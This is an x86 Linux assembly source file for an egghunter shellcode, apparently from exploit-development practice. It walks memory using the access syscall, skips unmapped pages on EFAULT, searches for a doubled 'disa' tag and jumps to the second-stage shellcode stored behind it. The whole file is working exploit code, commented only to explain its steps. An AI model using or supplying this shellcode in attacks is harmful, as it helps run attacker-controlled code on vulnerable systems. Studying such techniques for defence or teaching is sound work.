global _start

section .text

_start:
       xor ebx, ebx
       xor ecx, ecx

next_page:
        or bx, 0xfff ;page alignment	

hunt:
        inc ebx          ;next address
        lea edx, [ebx+0x04]  ;compare values in [ebx] and [ebx+4]
        xor eax, eax
        mov al, 0x21     ;syscall for access
        int 0x80
		
        cmp al, 0xf2   ;check return value for EFAULT
        je next_page   ;if yes, go to next page
	mov edi, ebx   ;if not, ebx in edi for scasd
		
	mov eax, 0x64697361 ;tag = disa
        scasd           ;check eax==[edi] then increment edi
        jnz hunt        ;continue search
        scasd           ;check for second tag
        jnz hunt
        jmp edi         ;jump to second stage shellcode
